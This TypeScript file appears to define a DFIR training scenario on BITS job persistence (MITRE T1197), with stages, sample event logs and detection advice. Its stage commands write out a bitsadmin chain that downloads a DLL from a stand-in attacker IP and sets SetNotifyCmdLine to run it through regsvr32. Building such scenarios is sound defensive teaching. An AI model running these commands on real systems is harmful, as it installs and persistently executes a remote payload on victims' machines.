import type { LegacyDraftScenario } from '../legacy/normalize-legacy-draft-scenario';

export const scenario: LegacyDraftScenario = {
    id: 'dfir-bitsadmin-qmgr-persistence-bits-client',
    title: 'Microsoft & Mandiant DFIR — BITS Job Persistence & qmgr.db SetNotifyCmdLine Forensics (EventID 59 / 60 / 3)',
    category: 'MALWARE',
    mitreId: 'T1197',
    description:
      'Grounded in Microsoft Background Intelligent Transfer Service (BITS) documentation, Mandiant qmgr.db forensic research, and MITRE ATT&CK T1197: an adversary creates a persistent BITS transfer job using bitsadmin.exe and configures /SetNotifyCmdLine so svchost.exe (-k netsvcs -s BITS) repeatedly downloads and executes a payload while storing state in C:\\ProgramData\\Microsoft\\Network\\Downloader\\qmgr.db.',
    NodesGenerator: () => [
      { id: 'attacker', label: 'External Staging Server (:443)', type: 'attacker', status: 'compromised' },
      { id: 'firewall', label: 'Enterprise Proxy (HTTP Range)', type: 'firewall', status: 'compromised' },
      { id: 'target', label: 'svchost.exe (BITS Service)', type: 'server', status: 'compromised' },
      { id: 'siem', label: 'Bits-Client Operational Log', type: 'siem', status: 'normal' },
      { id: 'ad', label: 'qmgr.db ESE Queue Database', type: 'ad', status: 'compromised' },
    ],
    stages: [
      {
        id: 1,
        title: 'Stage 1: BITS Transfer Job Creation & Remote File Addition (Bits-Client EventID 3 & 59)',
        narration:
          'The attacker runs bitsadmin /create /download WinUpdateSync and bitsadmin /addfile WinUpdateSync https://198.51.100.88/stage.dll C:\\Users\\Public\\stage.dll. The Microsoft-Windows-Bits-Client/Operational log records EventID 3 (BITS service created a new job) and EventID 59 (BITS started the transfer job with the associated URL).',
        activeNodes: ['attacker', 'firewall', 'target'],
        mitreTactic: 'Defense Evasion (T1197 - BITS Jobs)',
        technicalCommands: [
          'bitsadmin.exe /create /download WinUpdateSync',
          'bitsadmin.exe /addfile WinUpdateSync https://198.51.100.88/stage.dll C:\\Users\\Public\\stage.dll',
          'Bits-Client/Operational EventID 59: transferId={7B92A110-4C19-4F02-9B12-841029384756} url=https://198.51.100.88/stage.dll',
        ],
        defenseMitigation:
          'Ingest Microsoft-Windows-Bits-Client/Operational Event IDs 3, 59, 60, and 61 into the SIEM and alert on non-Microsoft domains or IP-literal URLs.',
        logs: [
          {
            id: 'dfir-bits-1',
            timestamp: '08:41:19.220',
            source: 'WinEvent',
            severity: 'high',
            EventCode: 59,
            ProcessName: 'bitsadmin.exe',
            CommandLine: 'bitsadmin.exe /addfile WinUpdateSync https://198.51.100.88/stage.dll C:\\Users\\Public\\stage.dll',
            raw: 'LogName: Microsoft-Windows-Bits-Client/Operational | EventID: 59 | jobTitle: WinUpdateSync | jobId: {7B92A110-4C19-4F02-9B12-841029384756} | url: https://198.51.100.88/stage.dll | fileLocalName: C:\\Users\\Public\\stage.dll | processPath: C:\\Windows\\System32\\bitsadmin.exe',
            parsedFields: {
              LogChannel: 'Microsoft-Windows-Bits-Client/Operational',
              EventID: '3 (Job Created) / 59 (Transfer Started)',
              JobTitle: 'WinUpdateSync',
              RemoteUrl: 'https://198.51.100.88/stage.dll',
            },
          },
        ],
      },
      {
        id: 2,
        title: 'Stage 2: SetNotifyCmdLine Persistence & qmgr.db ESE Serialization',
        narration:
          'The attacker configures bitsadmin /SetNotifyCmdLine WinUpdateSync C:\\Windows\\System32\\regsvr32.exe "regsvr32.exe /s C:\\Users\\Public\\stage.dll" and /SetMinRetryDelay WinUpdateSync 60. BITS serializes the job GUID, URL, local path, and notification command into the Extensible Storage Engine database C:\\ProgramData\\Microsoft\\Network\\Downloader\\qmgr.db (or qmgr0.dat/qmgr1.dat).',
        activeNodes: ['target', 'ad', 'siem'],
        mitreTactic: 'Persistence (T1197 - BITS SetNotifyCmdLine & qmgr.db)',
        technicalCommands: [
          'bitsadmin.exe /SetNotifyCmdLine WinUpdateSync C:\\Windows\\System32\\regsvr32.exe "regsvr32.exe /s C:\\Users\\Public\\stage.dll"',
          'bitsadmin.exe /SetMinRetryDelay WinUpdateSync 60',
          'ESE Artifact: C:\\ProgramData\\Microsoft\\Network\\Downloader\\qmgr.db (carved via BitsParser)',
        ],
        defenseMitigation:
          'Audit active BITS jobs via bitsadmin /list /allusers /verbose and parse C:\\ProgramData\\Microsoft\\Network\\Downloader\\qmgr.db for historical deleted job records.',
        logs: [
          {
            id: 'dfir-bits-2',
            timestamp: '08:41:21.504',
            source: 'Sysmon',
            severity: 'critical',
            EventCode: 1,
            ProcessName: 'bitsadmin.exe',
            CommandLine: 'bitsadmin.exe /SetNotifyCmdLine WinUpdateSync C:\\Windows\\System32\\regsvr32.exe "regsvr32.exe /s C:\\Users\\Public\\stage.dll"',
            raw: 'EventID: 1 | Image: C:\\Windows\\System32\\bitsadmin.exe | CommandLine: bitsadmin.exe /SetNotifyCmdLine WinUpdateSync C:\\Windows\\System32\\regsvr32.exe "regsvr32.exe /s C:\\Users\\Public\\stage.dll" | QueueDatabase: C:\\ProgramData\\Microsoft\\Network\\Downloader\\qmgr.db',
            parsedFields: {
              EventID: '1 (Sysmon ProcessCreate)',
              NotifyProgram: 'C:\\Windows\\System32\\regsvr32.exe',
              NotifyParameters: 'regsvr32.exe /s C:\\Users\\Public\\stage.dll',
              ForensicDatabase: 'C:\\ProgramData\\Microsoft\\Network\\Downloader\\qmgr.db',
            },
          },
        ],
      },
      {
        id: 3,
        title: 'Stage 3: BITS Transfer Completion (EventID 60) & svchost.exe Child Execution',
        narration:
          'When bitsadmin /resume WinUpdateSync completes the HTTP download (User-Agent: Microsoft BITS/7.8), Bits-Client logs EventID 60 (BITS stopped transferring the job) and the service host process (svchost.exe -k netsvcs -s BITS) directly spawns regsvr32.exe /s C:\\Users\\Public\\stage.dll.',
        activeNodes: ['target', 'ad', 'siem'],
        mitreTactic: 'Execution (T1197 - svchost.exe -k netsvcs Child Process)',
        technicalCommands: [
          'bitsadmin.exe /resume WinUpdateSync',
          'Bits-Client EventID 60: bytesTotal=184320 bytesTransferred=184320',
          'Sysmon EventID 1: ParentImage=C:\\Windows\\System32\\svchost.exe (-k netsvcs -s BITS) -> Image=C:\\Windows\\System32\\regsvr32.exe',
        ],
        defenseMitigation:
          'Alert on any child process (regsvr32.exe, cmd.exe, powershell.exe, rundll32.exe) spawned by svchost.exe hosting the BITS service.',
        logs: [
          {
            id: 'dfir-bits-3',
            timestamp: '08:41:24.890',
            source: 'Sysmon',
            severity: 'critical',
            EventCode: 1,
            ProcessName: 'regsvr32.exe',
            CommandLine: 'regsvr32.exe /s C:\\Users\\Public\\stage.dll',
            raw: 'EventID: 1 | ParentImage: C:\\Windows\\System32\\svchost.exe | ParentCommandLine: C:\\Windows\\System32\\svchost.exe -k netsvcs -p -s BITS | Image: C:\\Windows\\System32\\regsvr32.exe | CommandLine: regsvr32.exe /s C:\\Users\\Public\\stage.dll | Correlated Bits-Client EventID 60',
            parsedFields: {
              EventID: '1 (Sysmon) / 60 (Bits-Client Transfer Complete)',
              ParentServiceHost: 'svchost.exe -k netsvcs -p -s BITS',
              SpawnedChild: 'regsvr32.exe /s C:\\Users\\Public\\stage.dll',
              HttpUserAgent: 'Microsoft BITS/7.8',
            },
          },
        ],
      },
    ],
  };
